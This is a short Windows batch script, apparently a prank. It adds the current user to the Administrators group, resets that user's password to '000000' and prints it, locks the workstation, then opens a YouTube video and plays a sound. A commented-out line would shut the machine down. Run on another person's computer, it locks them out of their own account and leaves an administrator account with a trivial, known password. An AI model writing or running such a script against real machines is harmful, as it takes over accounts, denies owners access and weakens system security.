@echo off
set username=%USERNAME%
set newpassword=000000

:: Add the user to the Administrators group
net localgroup Administrators [%username%] /add

:: Change the user's password
net user %username% %newpassword%

echo The username is: %username%
echo The new password is: %newpassword%

:: Lock the workstation
rundll32.exe user32.dll, LockWorkStation

:: Open YouTube in Microsoft Edge
powershell -Command "Start-Process 'msedge.exe' 'https://www.youtube.com/watch?v=f3BPx2lt6E0&autoplay=1'"

:: Optional: Shutdown the computer after 15 seconds
::shutdown.exe /s /t 15

:: Optional: Play a sound file
start /min mplay32 /play /close "C:\path\to\your\soundfile.wav"
